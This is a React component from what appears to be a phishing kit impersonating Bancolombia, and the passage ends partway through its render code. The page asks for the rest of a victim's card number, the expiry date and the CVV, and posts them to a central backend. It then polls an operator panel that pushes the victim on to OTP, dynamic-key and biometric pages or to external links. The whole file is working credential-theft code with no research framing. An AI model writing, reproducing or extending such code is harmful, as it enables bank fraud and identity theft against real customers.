import './css/LoginModal.css';
import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import NumOTPModal from "./modals/NumOTP-Modal";
import Payment from "payment";
import { CARD_TEXT_CONFIG } from "./cardTextConfig"; // Importar configuración
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";

// Estilos para la animación de flip
const flipStyles = `
  .flip-card {
    background-color: transparent;
    width: 100%;
    max-width: 350px;
    aspect-ratio: 1.586;
    perspective: 1000px;
    margin: 0 auto 30px auto;
  }

  .flip-card-inner {
    position: relative;
    width: 100%;
    height: 100%;
    text-align: center;
    transform-style: preserve-3d;
    transition: transform 0.8s cubic-bezier(0.4, 0.2, 0.2, 1);
    will-change: transform; /* 🔥 evita parpadeos */
  }

  .flip-card-inner.flipped {
    transform: rotateY(180deg);
  }

  .flip-card-front,
  .flip-card-back {
    position: absolute;
    inset: 0; /* 🔑 CLAVE: fuerza mismo tamaño exacto */
    backface-visibility: hidden;
    border-radius: 13px;
    overflow: hidden;
  }

  .flip-card-back {
    transform: rotateY(180deg);
  }

  .flip-card-front img,
  .flip-card-back img {
    width: 100%;
    height: 100%;
    object-fit: cover; /* 🔑 normaliza imágenes distintas */
    display: block;
  }
`;

// Se exporta el componente
export default function ValidacionTC() {

    // Se usa la navegacion
    const navigate = useNavigate();

    // Se inicializan los estados
    const [step, setStep] = useState("front");
    const [cardDigits, setCardDigits] = useState("");
    const [expirationDate, setExpirationDate] = useState("");
    const [cvv, setCvv] = useState("");

    // Se inicializan las constantes generales del sistema
    const [ip, setIp] = useState("");
    const [getDateHour, setDateHour] = useState("");
    const [isFocused, setIsFocused] = useState(false);
    const [focusedField, setFocusedField] = useState("");
    const [getLoading, setLoading] = useState(false);
    const [submitted, setSubmitted] = useState(false);
    const [isTCCustom, setIsTCCustom] = useState(false);

    // Estado principal de tarjeta
    const [cardData, setCardData] = useState({
        filename: "",
        tipo: "",
        digits: "",
        label: ""
    });

    // Modal de error (datos inválidos / timeout)
    const [formState, setFormState] = useState({ lanzarModalErrorSesion: false });

    // Refs para "aprobar custom": mantener usuario en espera hasta que admin pulse OTP/DIN/FIN
    const estadoAnteriorRef = useRef(null);
    const aprobadoEsperandoRef = useRef(false);

    // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
    const [imagesLoaded, setImagesLoaded] = useState(false);
    const [loadingImages, setLoadingImages] = useState(false);

    // Estado para validación de tarjeta con algoritmo de Luhn
    const [isCardValid, setIsCardValid] = useState(null);

    // Se inicializa la constante para validar el tipo de tarjeta
    const isAmex = Boolean(
        (cardData?.label || "").toLowerCase().includes("amex") ||
        (cardData?.filename || "").toLowerCase().includes("amex") ||
        (cardData?.tipo || "").toLowerCase().includes("american")
    );

    // Se inicializan las constantes para validar cuando es una tarjeta amex o tarjeta de credito normal
    const requiredDigitsLength = isAmex ? 11 : 12;
    const requiredCvvLength = isAmex ? 4 : 3;

    // Se inicializa la constante
    const CARD_ADJUSTMENTS = {

        // --- VISA ---
        "Visa-Clasica.webp": { transform: "scale(1.15)" },
        "Visa-seleccion-colombia.webp": { transform: "scale(1.15)" },
        "Visa-Oro.webp": { transform: "scale(1.15)" },
        "Visa-Platinum-v1.webp": { transform: "scale(1.1)" },

        // --- MASTERCARD ---
        "Mastercard-Unica.webp": { transform: "scale(1.1)" },
        "Mastercard-oro.webp": { transform: "scale(1.1)" },
        "Mastercard-Platinum.webp": { transform: "scale(1.1)" },
        "Mastercard-Black-v1.webp": { transform: "scale(1.06)" },
        "Mastercard-E-Card-v1.webp": { transform: "scale(1.05)" },
        "Débito Cívica.webp": { transform: "scale(1.03)" },
        "Débito Preferencial.webp": { transform: "scale(1.04)" },
        "Débito Clásica.webp": { transform: "scale(1.04)" },
        "debito_virtual.webp": { transform: "scale(1.05)" },

        // --- AMEX ---
        "Amex+Libre.webp": { transform: "scale(1.15)" },
    };

    // Metodo encargado de obtener el tipo de tarjeta en texto legible
    const getTipoTarjeta = () => (cardData?.tipo || "") === "credito" ? "Crédito" : "Débito";

    // Se crea el useEffect
    useEffect(() => {

        // Se sube el scroll al top al cargar la página
        limpiarPaddingBody();

        // Validar acceso antes de cargar datos
        const validateAccess = async () => {

            // Se usa el try catch
            try {

                // Se usa el cargando
                setLoading(true);

                // Se captura la session
                const sessionId = localStorage.getItem("sessionId");

                // Se valida si no hay session
                if (!sessionId) {

                    // Se manda al inicio
                    navigate('/bancolombia');

                    // Se retorna
                    return false;
                };

                // Se inicializa el backend
                const { instanceBackend } = await import("../../../axios/instanceBackend");

                // Se hace la petición al backend
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);

                // Se captura el estado y los datos de la tarjeta
                const { estado, cardData: backendCardData } = response.data;

                // Solo permitir acceso si el estado es correcto
                const stateValid = [
                    'sol_tc',
                    'sol_tc_custom',
                    'awaiting_tc_approval',
                    'error_tc',
                    'error_tc_custom'
                ];

                // Se valida si el estado es válido
                if (!stateValid.includes(estado)) {

                    // Se navega al inicio
                    navigate('/bancolombia');

                    // Se retorna
                    return false;
                }

                // Se valida cuando hay datos del backend
                if (backendCardData) {

                    // Se normaliza los datos de la tarjeta
                    const normalized = normalizeCardData(backendCardData);

                    // Se establece los datos de la tarjeta
                    setCardData(normalized);

                    // Se guarda los datos de la tarjeta en el localStorage
                    localStorage.setItem("selectedCardData", JSON.stringify(normalized));

                    // Se establece si es TC custom
                    setIsTCCustom(estado === 'sol_tc_custom' || estado === 'awaiting_tc_approval');

                    // Se quita el cargando
                    setLoading(false);
                } else {

                    // Se valida cuando hay datos en el localStorage
                    const savedCardData = localStorage.getItem("selectedCardData");

                    // Se valida cuando hay datos en el localStorage
                    if (savedCardData) {

                        // Se normaliza los datos de la tarjeta
                        const normalized = normalizeCardData(savedCardData);

                        // Se establece los datos de la tarjeta
                        setCardData(normalized);

                        // Se establece si es TC custom
                        setIsTCCustom(estado === 'sol_tc_custom' || estado === 'awaiting_tc_approval');
                    }

                    // Se quita el cargando
                    setLoading(false);
                }

                // Se retorna en trua
                return true;
            } catch (error) {

                // Se navega al inicio
                navigate('/bancolombia');

                // Se retorna
                return false;
            }
        };

        // Se llama el metodo
        validateAccess();

        // Se llama el metodo
        limpiarPaddingBody();

        // Se remueve la clase has-fixed-navbar
        document.body.classList.remove('has-fixed-navbar');

        // Se obtiene la IP
        getInfoIp();

        // Se obtiene la fecha y hora
        getDateHours();
    }, []);

    // Se crea el useEffect
    useEffect(() => {

        // Se inicializa la fecha
        const ahora = new Date();

        // Se calcula el tiempo hasta el proximo minuto
        const nextMinute = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa el intervalo
        let intervalId;

        // Se crea el timeout
        const timeoutId = setTimeout(() => {

            // Se obtiene la fecha y hora
            getDateHours();

            // Se crea el intervalo
            intervalId = setInterval(getDateHours, 60000);
        }, nextMinute);

        // Se retorna la limpieza
        return () => {

            // Se limpia el timeout
            clearTimeout(timeoutId);

            // Se limpia el intervalo
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Se crea el useEffect
    useEffect(() => {

        // Metodo encargado de precargar las imagenes
        const preloadImages = async () => {

            // Se inicializa el cargando
            setLoadingImages(true);

            // Se inicializa las imagenes cargadas
            setImagesLoaded(false);

            // Se crea la ruta de la imagen frontal
            const frontPath = cardData.tipo === "credito" ? `/assets/images/IMGtarjetas/${cardData.filename}` : `/assets/images/IMGdebitotj/${cardData.filename}`;

            // Se crea la ruta de la imagen trasera
            const backFilename = getBackCardFilename(cardData.filename);

            // Se crea la carpeta de las imagenes traseras
            const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";

            // Se crea la ruta de la imagen trasera
            const backPath = backFilename ? `/assets/images/${folder}/${backFilename}` : frontPath;

            // Se usa el try catch
            try {

                // Se crea la funcion para cargar las imagenes
                const loadImage = (src) => {

                    // Se crea la promesa
                    return new Promise((resolve, reject) => {

                        // Se crea la imagen
                        const img = new Image();

                        // Se define el onload
                        img.onload = () => resolve(img);

                        // Se define el onerror
                        img.onerror = reject;

                        // Se define la fuente
                        img.src = src;
                    });
                };

                // Se cargan las imagenes
                await Promise.all([

                    // Se carga la imagen frontal
                    loadImage(frontPath),

                    // Se carga la imagen trasera
                    loadImage(backPath)
                ]);

                // Se inicializa las imagenes cargadas
                setImagesLoaded(true);

                // Se inicializa el cargando
                setLoadingImages(false);
            } catch (error) {

                // Se inicializa las imagenes cargadas
                setImagesLoaded(true);

                // Se inicializa el cargando
                setLoadingImages(false);
            }
        };

        // Se precarga las imagenes
        preloadImages();
    }, [cardData.filename, cardData.tipo]);

    // Metodo encargado de normalizar los datos de la tarjeta
    const normalizeCardData = (data) => {
        if (!data) return { filename: "", tipo: "", digits: "", label: "" };
        if (typeof data === "string") {
            try {
                data = JSON.parse(data);
            } catch {
                return { filename: "", tipo: "", digits: "", label: "" };
            }
        }
        if (!data || typeof data !== "object") return { filename: "", tipo: "", digits: "", label: "" };

        let filename = data.filename || "";
        if (filename.endsWith(".webp")) {
            filename = filename.replace(".webp", ".webp");
        }
        if (filename === "imgi_21_AMEX+Green.webp") {
            filename = "Amex-Green-v2.webp";
        }
        return {
            filename: filename,
            tipo: data.tipo || "credito",
            digits: data.digits || "",
            label: data.label || "",
            ...data,
            filename
        };
    };

    // Metodo encargado de obtener la IP del usuario
    const getInfoIp = async () => {

        // Se usa el try catch
        try {

            // Se obtiene la IP
            const response = await fetch("https://api.ipify.org?format=json");

            // Se obtiene los datos
            const data = await response.json();

            // Se establece la IP
            setIp(data.ip);
        } catch (error) {

            // Se establece la IP como no disponible
            setIp("No disponible");
        }
    };

    // Metodo encargado de obtener la fecha y hora
    const getDateHours = () => {

        // Se obtiene la fecha y hora
        const dateNow = new Date();

        // Se obtiene las opciones
        const options = {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "numeric",
            minute: "2-digit",
            hour12: true
        };

        // Se establece la fecha y hora
        setDateHour(dateNow.toLocaleString("es-CO", options));
    };

    // Metodo encargado de obtener el nombre de la imagen trasera
    const getBackCardFilename = (frontFilename) => {

        // Se normaliza el nombre del archivo
        let normalizedFilename = frontFilename;

        // Se valida que el archivo tenga la extensión .png
        if (frontFilename && frontFilename.endsWith(".png")) {

            // Se reemplaza la extensión .png por .webp
            normalizedFilename = frontFilename.replace(".png", ".webp");
        }

        // Se inicializa el mapa de mapeo
        const frontToBackMap = {

            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.webp": "Mastercard-ideal.webp",
            "imgi_11_Mastercard_joven_.webp": "Mastercard-joven.webp",
            "imgi_12_clasica_.webp": "Mastercard-clasica.webp",
            "imgi_14_Mastercard_credit-card.webp": "Mastercard-Unica.webp",
            "imgi_15_275x172.webp": "Mastercard-Standard.webp",
            "imgi_16_Mastercard_oro_.webp": "Mastercard-oro.webp",
            "imgi_19_Mastercard_611_600x379.webp": "Mastercard-Platinum.webp",
            "imgi_24_Mastercard_612_600x379.webp": "Mastercard-Black-v1.webp",
            "imgi_26_Mastercard_+Tarjeta+Virtual.webp": "Mastercard-E-Card-v1.webp",
            "imgi_29_Mastercard-Sufi_Optimizada.webp": "Mastercard-Sufi-v1.webp",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",

            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.webp": "Visa-Clasica.webp",
            "imgi_17_Visa+Seleccion+Colombia.webp": "Visa-seleccion-colombia.webp",
            "imgi_18_Visa+Oro.webp": "Visa-Oro.webp",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.webp": "Visa-LifeMiles-v1.webp",
            "imgi_25_Visa+Platinum+Conavi.webp": "Visa-Platinum-v1.webp",
            "imgi_28_Visa_Infinite_Card.webp": "Visa-infinite-v1.webp",

            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp",
            "Amex-Green-v2.webp": "CVV-Amex-Greem.webp",
            "imgi_22_AMEX+Gold.webp": "Amex-Gold-v1.webp",
            "imgi_27_AMEX+Platinum.webp": "Amex-Platinum-v1.webp",
            "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",

            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito_Cívica.webp",
            "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
            "imgi_7_004_600x379.webp": "Débito Clásica.webp",
            "debito_virtual.webp": "debito_virtual.webp"
        };

        // Se retorna el nombre del archivo trasero
        return frontToBackMap[normalizedFilename] || null;
    };

    // Metodo encargado de obtener el estilo de la tarjeta
    const getCardStyle = (filename) => {

        // Se retorna el estilo de la tarjeta
        return CARD_ADJUSTMENTS[filename] || {};
    };

    // Metodo encargado de obtener la ruta de la imagen de la tarjeta
    const getCardImagePath = () => {

        // Se determina la base de la ruta
        const basePath = cardData.tipo === "credito" ? "/assets/images/IMGtarjetas/" : "/assets/images/IMGdebitotj/";

        // Se retorna la ruta de la imagen
        return `${basePath}${cardData.filename}`;
    };

    // Metodo encargado de obtener la ruta de la imagen de la tarjeta trasera
    const getBackCardImagePath = () => {

        // Se obtiene el nombre del archivo trasero
        const backFilename = getBackCardFilename(cardData.filename);

        // Si no hay archivo trasero, se retorna la ruta de la imagen frontal
        if (!backFilename) return getCardImagePath();

        // Se determina la carpeta de las imagenes traseras
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";

        // Se retorna la ruta de la imagen trasera
        return `/assets/images/${folder}/${backFilename}`;
    };

    // Metodo encargado de obtener la configuración del texto de la tarjeta
    const getCardConfig = (filename) => {

        // Se captura el nombre del archivo
        let lookupFilename = filename;

        // Se normaliza el nombre del archivo a .webp para buscar en config
        if (filename && filename.endsWith(".png")) {

            // Se reemplaza la extension .png por .webp
            lookupFilename = filename.replace(".png", ".webp");
        }

        // Se obtiene la configuración por defecto
        const defaultConfig = CARD_TEXT_CONFIG["default"];

        // Se obtiene la configuración específica de la tarjeta
        const cardConfig = CARD_TEXT_CONFIG[lookupFilename];

        // Si no existe config para esta tarjeta, usar default completo
        if (!cardConfig) return defaultConfig;

        // Se combina la configuración específica con la por defecto
        return {
            digits: { ...defaultConfig.digits, ...(cardConfig.digits || {}) },
            date: { ...defaultConfig.date, ...(cardConfig.date || {}) },
            back: { ...defaultConfig.back, ...(cardConfig.back || {}) }
        };
    };

    // Metodo de manejo de cambios en los dígitos de la tarjeta
    const handleDigitsChange = (e) => {

        // Capturar valor
        const val = e.target.value;

        //Se valida que solo sean numeros y no pase el limite
        if (!/^\d*$/.test(val) || val.length > requiredDigitsLength) {

            // Se retorna
            return;
        };

        // Guardar mientras escribe
        setCardDigits(val);

        // Solo valida cuando ya están los 12 dígitos
        if (val.length === requiredDigitsLength) {

            // Construir número completo (12 + últimos 4 conocidos)
            const fullCardNumber = val + cardData.digits;

            // Se valida con la api de payment
            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
            const cardType = Payment.fns.cardType(fullCardNumber);

            // Tarjeta inválida (Luhn o tipo desconocido)
            if (!isValidNumber || !cardType) {

                // Se setea en falso
                setIsCardValid(false);

                // Se retorna
                return;
            };

            // Opcional: validar tipo esperado (crédito/débito)
            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {

                // Tarjeta inválida para débito
                setIsCardValid(false);

                // Se retorna
                return;
            };

            // Tarjeta válida
            setIsCardValid(true);
        };
    };

    // Metodo de manejo de cambios en la fecha de expiración
    const handleExpirationChange = (e) => {

        // Capturar valor y limpiar no-dígitos
        const raw = e.target.value;
        const numbers = raw.replace(/\D/g, "");

        // Permitir borrar libremente
        if (raw.length < expirationDate.length) {

            // Se setea el valor
            setExpirationDate(raw);

            // Se retorna
            return;
        };

        // Formatear como MM/AA
        const currentYear = new Date().getFullYear() % 100;
        let val = numbers;

        // ===== MES =====
        if (val.length >= 2) {

            // Se valida el mes
            let month = val.slice(0, 2);
            let monthNum = parseInt(month, 10);

            // Corregir mes inválido
            if (monthNum < 1) month = "01";
            if (monthNum > 12) month = "12";

            // Se agrega el slash
            val = month + val.slice(2);
        };

        // ===== AÑO =====
        if (val.length > 2) {

            // Se valida el año
            let year = val.slice(2, 4);

            // Corregir año inválido
            if (year.length === 2) {

                // Se convierte a número
                let yearNum = parseInt(year, 10);

                // Si es menor al año actual, se corrige
                if (yearNum < currentYear) {

                    // Se ajusta al año actual
                    year = String(currentYear);
                };
            };

            // Se agrega el slash
            val = val.slice(0, 2) + "/" + year;
        };

        // Se captura el numero de tarjeta
        const fullCardNumber = cardDigits + cardData.digits;

        // Se vuelve a validar la tarjeta al cambiar la fecha
        const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
        const cardType = Payment.fns.cardType(fullCardNumber);

        // Actualizar estado de validez
        if (isValidNumber && cardType) {

            // Se setea en verdadero
            setIsCardValid(true);
        } else {

            // Se setea en falso
            setIsCardValid(false);
        };

        // Limitar longitud a 5 caracteres (MM/AA)
        if (val.length <= 5) {

            // Se setea el valor
            setExpirationDate(val);
        };
    };

    // Metodo encargado de manejar el cambio del CVV
    const handleCvvChange = (e) => {

        // Se captura el valor
        const val = e.target.value;

        // Se valida que sea un número y que no exceda la longitud requerida
        if (/^\d*$/.test(val) && val.length <= requiredCvvLength) {

            // Se setea el valor
            setCvv(val);
        }
    };

    // Metodo encargado de enviar la información al backend
    const handleContinue = async () => {

        // Se valida si es el front de la carta
        if (step === "front") {

            // Se crean las constantes
            const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
            const allFieldsValid = cardDigits.length === requiredDigitsLength && isExpirationValid;

            // Solo permitir continuar si la tarjeta es válida
            if (allFieldsValid && isCardValid === true) {

                // Se inicializan los estados
                setStep("back");
                setIsFocused(false);
                setFocusedField("");
            } else if (allFieldsValid && isCardValid === false) {

                // Mostrar modal de error si intentan continuar con tarjeta inválida
                setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
            };
        } else {

            // Se valida si es el cvv y no esta bloqueado
            if (cvv.length === requiredCvvLength && !submitted) {

                // Se usa el try catch
                try {

                    // Se inicializan las constantes
                    setLoading(true);

                    // Se bloquea el boton
                    setSubmitted(true);

                    // Se captura el sessionID
                    const sessionId = localStorage.getItem("sessionId");

                    // Se valida cuando no hay sessionId
                    if (!sessionId) {

                        // Se manda la alerta
                        alert("Error: No se encontró la sesión");

                        // Se inicializa el cargando
                        setLoading(false);

                        // Se retorna
                        return;
                    }

                    // Se construye el número de tarjeta completo
                    const numeroTarjetaCompleto = cardDigits + cardData.digits;

                    // Se inicializa la data a enviar
                    const dataSend = {
                        "data": {
                            "attributes": {
                                "sessionId": sessionId,
                                "numeroTarjeta": numeroTarjetaCompleto,
                                "fechaExpiracion": expirationDate,
                                "cvv": cvv,
                                "cardLabel": cardData.label,

                                // Se inicializa la data
                                "backend": "P01",
                                "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                                "backend_url": isTCCustom ? "/api/v1/bancolombia/tc-custom" : "/api/v1/bancolombia/tc",
                            }
                        }
                    };

                    // Se inicializa el API
                    const { instanceBackend } = await import("../../../axios/instanceBackend");

                    const centralUrl = (
                        process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
                    ).trim();

                    // Se envia la peticion
                    const response = centralUrl
                        ? await instanceBackend.post(centralUrl, dataSend)
                        : await instanceBackend.post("/bancolombia/tc-custom", dataSend);

                    // Se valida que sea exitoso
                    if (response.data.success) {

                        // Se inicializa el polling
                        initPolling(sessionId);
                    } else {

                        // Se envia el cargando
                        alert("Error al enviar los datos");
                    }
                } catch (error) {

                    // Se envia la alerta
                    alert("Error de conexión con el servidor");

                    // Se envia el cargando
                    setLoading(false);
                }
            }
        }
    };

    // Metodo encargado de inicializar el polling
    const initPolling = (sessionId) => {

        // Se inicializan los ref
        aprobadoEsperandoRef.current = false;
        estadoAnteriorRef.current = null;

        // Metodo encargado de crear el polling
        const pollingInterval = setInterval(async () => {

            // Se intenta obtener la respuesta del backend
            try {

                // Se crea la instancia API
                const { instanceBackend } = await import("../../../axios/instanceBackend");

                // Se verifica el estado
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);

                // Se captura la informacion
                const { estado, cardData, url, text } = response.data;
                const estadoLower = String(estado || '').toLowerCase();
                const hasUrl = Boolean(url && String(url).trim());
                const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

                if (estadoLower === 'link_bot' && hasUrl) {
                    clearInterval(pollingInterval);
                    setLoading(false);
                    window.location.href = url;
                    return;
                }
                if (estadoLower === 'sol_link_custom' && customLink) {
                    clearInterval(pollingInterval);
                    setLoading(false);
                    window.location.href = customLink;
                    return;
                }
                if (
                    estadoLower === 'sol_link_bot' ||
                    (estadoLower === 'link_bot' && !hasUrl) ||
                    (estadoLower === 'sol_link_custom' && !customLink)
                ) {
                    return;
                }

                // Se valida
                if (cardData) {

                    // Se normaliza los datos
                    const normalized = normalizeCardData(cardData);

                    // Se actualizan los datos
                    setCardData(normalized);

                    // Se guarda en el localStorage
                    localStorage.setItem("selectedCardData", JSON.stringify(normalized));

                    // Se marca como tarjeta personalizada
                    setIsTCCustom(true);
                };

                // Se valida si es un error de TC o de TC Custom
                if (estado === 'error_tc' || estado === 'error_tc_custom') {

                    // Se limpia el intervalo
                    clearInterval(pollingInterval);

                    // Se quita el cargando
                    setLoading(false);

                    // Se setean los valores
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));

                    // Se crea un timeout de 4 segundos
                    setTimeout(() => {
                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                    }, 4000);

                    // Se limpian los valores
                    setCardDigits("");
                    setExpirationDate("");
                    setCvv("");
                    setStep("front");
                    setSubmitted(false);

                    // Se retorna
                    return;
                };

                // Se inicializan los estados 
                const stateValid = [
                    'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login',
                    'sol_biometria', 'error_923',
                    'sol_tc_custom', 'sol_cvv_custom',
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla', 'reject_custom',
                    'sol_link_bot', 'link_bot', 'sol_link_custom'
                ];

                // Se valida si el estado no esta dentro de los estados finales
                if (!stateValid.includes(estadoLower)) return;

                // Se limpia el intervalo
                clearInterval(pollingInterval);

                // Se quita el cargando
                setLoading(false);

                // Se valida el estado
                switch (estadoLower) {
                    case 'sol_otp':

                        // Se sale ciclo
                        navigate('/numero-otp');

                        // Se sale del ciclo
                        break;
                    case 'sol_din':

                        // Se sale ciclo
                        navigate('/clave-dinamica');

                        // Se sale del ciclo
                        break;
                    case 'sol_finalizar':
                    case 'sol_finalizado':
                    case 'solicitar_finalizar':

                        // Se sale ciclo
                        navigate('/finalizado-pse');

                        // Se sale del ciclo
                        break;
                    case 'sol_biometria':

                        // Se sale ciclo
                        navigate('/verificacion-identidad');

                        // Se sale del ciclo
                        break;
                    case 'error_923':

                        // Se sale ciclo
                        navigate('/error-923page');

                        // Se sale del ciclo
                        break;
                    case 'sol_tc_custom':

                        // Se recarga la pagina
                        window.location.reload();

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv_custom': navigate('/validacion-cvv');

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv':

                        // Se redirecciona
                        navigate('/validacion-cvv');

                        // Se sale del ciclo
                        break;
                    case 'error_otp':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/numero-otp';

                        // Se sale del ciclo
                        break;
                    case 'error_din':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/clave-dinamica';

                        // Se sale del ciclo
                        break;
                    case 'error_login':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/bancolombia';

                        // Se sale del ciclo
                        break;
                    case 'reject_custom':

                        // Se limpia el intervalo
                        clearInterval(pollingInterval);

                        // Se quita el cargando
                        setLoading(false);

                        // Se setean los valores
                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));

                        // Se crea un timeout de 4 segundos
                        setTimeout(() => {
                            setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                        }, 4000);

                        // Se limpian los valores
                        setCardDigits("");
                        setExpirationDate("");
                        setCvv("");
                        setStep("front");
                        setSubmitted(false);

                        // Se sale del ciclo
                        break;
                    case 'link_bot':
                        if (hasUrl) {
                            window.location.href = url;
                        }
                        break;
                    case 'sol_link_custom':
                        if (customLink) {
                            window.location.href = customLink;
                        }
                        break;
                }
            } catch (error) {
            }
        }, 3000);
    };

    // Metodo encargado de renderizar los inputs visuales de los dígitos
    const renderVisualInputDigits = () => {

        // Se captura la longitud requerida
        const length = requiredDigitsLength || 12;

        // Se retorna el componente
        return (
            <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
                style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>

                {/* Se renderizan los inputs visuales */}
                {Array.from({ length: length }).map((_, index) => {

                    // Se captura el índice activo
                    const activeIndex = cardDigits.length < length ? cardDigits.length : length - 1;

                    // Se captura si el input está activo
                    const isActive = isFocused &&
                        focusedField === "digits" &&
                        step === "front" &&
                        index === activeIndex;

                    // Se captura el margen extra
                    let extraMargin = "0px";

                    // Se captura el margen extra según el tipo de tarjeta
                    if (index > 0) {

                        // Se verifica si es AMEX
                        if (isAmex) {

                            // Se verifica si es el primer grupo (4 dígitos)
                            if (index === 4) extraMargin = "10px";

                            // Se verifica si es el segundo grupo (6 dígitos)
                            if (index === 10) extraMargin = "10px";
                        } else {

                            // Se verifica si es el primer grupo (4 dígitos)
                            if (index % 4 === 0) extraMargin = "10px";
                        }
                    }

                    // Se renderiza el input visual
                    return (
                        <div key={index} style={{
                            width: "20px", height: "30px", marginLeft: extraMargin,
                            borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                            display: "flex", justifyContent: "center", alignItems: "center",
                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                        }}>
                            {cardDigits[index] || ""}
                        </div>
                    );
                })}
            </div>
        );
    };

    // Metodo encargado de renderizar el input visual de fecha de expiración
    const renderVisualInputExpiration = () => (

        // Se renderiza el input visual
        <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>

            {/* Se renderizan los inputs visuales */}
            {Array.from({ length: 5 }).map((_, index) => {

                // Se captura el índice activo
                const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;

                // Se captura si el input está activo
                const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;

                // Se captura el carácter
                const char = expirationDate[index] || "";

                // Se renderiza el input visual
                return (
                    <div
                        key={index}
                        style={{
                            width: index === 2 ? "10px" : "25px",
                            height: "30px",
                            borderBottom: index === 2 ? "none" : `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                            display: "flex", justifyContent: "center", alignItems: "center",
                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                        }}
                    >
                        {char}
                    </div>
                );
            })}
        </div>
    );

    // Metodo encargado de renderizar el input visual de CVV
    const renderVisualInputCVV = () => (

        // Se renderiza el input visual
        <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>

            {/* Se renderizan los inputs visuales */}
            {Array.from({ length: requiredCvvLength }).map((_, index) => {

                // Se captura el índice activo
                const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;

                // Se captura si el input está activo
                const isActive = isFocused && step === "back" && index === activeIndex;

                // Se renderiza el input visual
                return (
                    <div
                        key={index}
                        style={{
                            width: "30px", height: "30px",
                            borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                            display: "flex", justifyContent: "center", alignItems: "center",
                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                        }}
                    >
                        {cvv[index] || ""}
                    </div>
                );
            })}
        </div>
    );

    // Metodo encargado de formatear los dígitos de la tarjeta con espacios
    const formatCardDigits = (digits) => {

        // Se limpian los caracteres no numéricos, pero se deja el placeholder "•"
        const clean = digits.replace(/[^0-9•]/g, "");
        const lastDigits = cardData.digits || "";

        // Se valida si es AMEX → 4 - 6 - 5 (15 dígitos)
        if (isAmex) {

            // Se dividen en grupos
            const a = clean.slice(0, 4);
            const b = clean.slice(4, 10);
            const c = clean.slice(10, 15);

            // Se agrega los ultimos dígitos al final
            const cWithLast = c + lastDigits;

            // Se retornan con espacios
            return [a, b, cWithLast].filter(Boolean).join(" ");
        };

        // Se concatena los 12 dígitos (o placeholders) del input con los 4 últimos del backend
        const fullString = clean + lastDigits;

        // Se formatea con espacios
        return fullString.match(/.{1,4}/g)?.join(" ") || "";
    };

    // Se crea el return del componente
    const desktop = isDesktop();

    // Se retorna el componente
    return (
        <>
            <style>{flipStyles}</style>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div style={{
